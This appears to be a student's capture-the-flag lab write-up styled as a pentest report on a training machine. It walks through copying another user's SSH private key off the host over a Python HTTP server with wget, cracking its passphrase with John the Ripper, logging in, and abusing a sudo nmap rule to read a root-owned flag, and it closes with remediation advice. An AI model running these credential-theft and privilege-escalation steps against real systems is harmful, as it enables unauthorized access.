<h1 align="center">
  Lab 01 | Lateral movement & Basic Privilege Escalation.
</h1>
<small align="center">This documentation will be formatted into a formal pentest report, to practice and also to look back and see see where I can improve.</small>

<h3>
  <strong>Lab Report: </strong> 01 | A Misconfiguration in Bean's directory.
</h3>

<h3>
  I. Executive Summary.
</h3>
<p>-Objective: Use bean's misconfiguration to gain excessive control or obtain confidential information.</p>
<p>-Result: <i>Success</i>, Obtained confidential information. </p>

<h3>II. Risk Rating.</h3>
<p>Risk severity: High. </p>

<h3>III. Impact.</h3>
<p>May gain super confidential information & may potentially compromise the system if configuration for Bean's are overlooked.</p>

<h3>IV. Technical Findings & Walkthrough</h3>
<p>- Findings: /home/bean/.ssh/id_rsa file SUID binary is world readable. (707) sudo privilege for nmap in Bean's account, leads to obtaining the root content and may potential even access greater information. </p><br>
  
```` 
john@TrainingGrounds:/home/Bean$ ls -la
total 24
drwx---rwx 3 Bean Bean 4096 Nov  2 21:11 .
drwxr-xr-x 5 root root 4096 Nov  2 20:48 ..
-rw-r--r-- 1 Bean Bean  220 Nov  2 20:48 .bash_logout
-rw-r--r-- 1 Bean Bean 3771 Nov  2 20:48 .bashrc
-rw-r--r-- 1 Bean Bean  807 Nov  2 20:48 .profile
drwx---rwx 2 Bean Bean 4096 Nov  2 20:54 .ssh
````
Step 1: Moving to ``.ssh`` hidden folder 
````
john@TrainingGrounds:/home/Bean$ cd ./.ssh
john@TrainingGrounds:/home/Bean/.ssh$ ls
authorized_keys  id_ed25519  id_ed25519.pub
````
step 2: Making a temporary python website to pass-through the id_rsa. This also can be done using scp. 
````
john@TrainingGrounds:/home/Bean/.ssh$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
````
step 3: Downloading the id_rsa.
````
Attacker@AttackerHost5:~/Training/SSH-Training$ wget http://LAB:9000/id_ed25519
--2026-11-02 21:24:17--  http://LAB:9000/id_ed25519
Connecting to LAB:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 464 [application/octet-stream]
Saving to: ‘id_ed25519’

id_ed25519                  100%[===============================================>]     464  --.-KB/s    in 0s      

2026-11-02 21:24:18 (41.2 MB/s) - ‘id_ed25519’ saved [464/464]

Attacker@AttackerHost:~/Training/SSH-Training$
````
Step 4: Converting the ``SSH`` to ``HASH``.
````
Attacker@AttackerHost:~/Training/SSH-Training$ python3 ssh2john.py id_ed25519 > id_ed25519.hash
````
Step 5: Using john the ripper to do a dictionary attack.
````
Attacker@AttackerHost:~/Training/SSH-Training/john/run$ ./john --format=SSH --wordlist ~/wordlists/wordlists/passwords/rockyou.txt ~/Training/SSH-Training/id_ed25519.hash
Warning: invalid UTF-8 seen reading /home/Attacker/wordlists/wordlists/passwords/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with wordlist:./password.lst
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
abc123           (id_ed25519)     
1g 0:00:00:01 DONE (2026-11-02 21:38) 0.6944g/s 44.44p/s 44.44c/s 44.44C/s 123456..green
Use the "--show" option to display all of the cracked passwords reliably
Session completed
````
Step 6: Let's confirm it.
````
Attacker@AttackerHost:~/Training/SSH-Training/john/run$ ./john --show ~/Training/SSH-Training/id_ed25519.hash 
id_ed25519:abc123

1 password hash cracked, 0 left
````
Step 7: SSH'ing to Bean account.
````
Attacker@AttackerHost:~/Training/SSH-Training/john/run$ cd ~/Training/SSH-Training/
Attacker@AttackerHost:~/Training/SSH-Training$ ^C
Attacker@AttackerHost:~/Training/SSH-Training$ 

Attacker@AttackerHost:~/Training/SSH-Training$ ssh -i id_ed25519 Bean@LAB
Enter passphrase for key 'id_ed25519': 
Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-42-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Nov  2 20:03:27 2026 from LAB
````
Step 8: Check for sudo permission.
````
Bean@TrainingGrounds:~$ sudo -l
User Bean may run the following commands on TrainingGrounds:
    (ALL) NOPASSWD: /usr/bin/nmap
````
We do have permission. Nmap, according to or looking at GTFObin's database, nmap can access or read-out files with no restriction in terms of file permission.
Step 9: Obtaining the confidential cookies.
````
Bean@TrainingGrounds:/$ sudo nmap -iL /root/flag
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-02 21:59 +0800
Failed to resolve "HHH{NICE_DONE_FELLA)".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.03 seconds
Bean@TrainingGrounds:/$ 
````
<h3>V.Remediation </h3>

Use stronger password for Bean's account. configure the file suid permission for Bean's ```.ssh``` directory within the baseline standards. removing ```/usr/bin/nmap``` in ``visudo`` to not let future hacker abuse this configuration to obtain further greater information or even establish a persistent threat.

#Reproducing the vulnerability.
<details>
<summary>Reproduce.</summary>



  
</details>
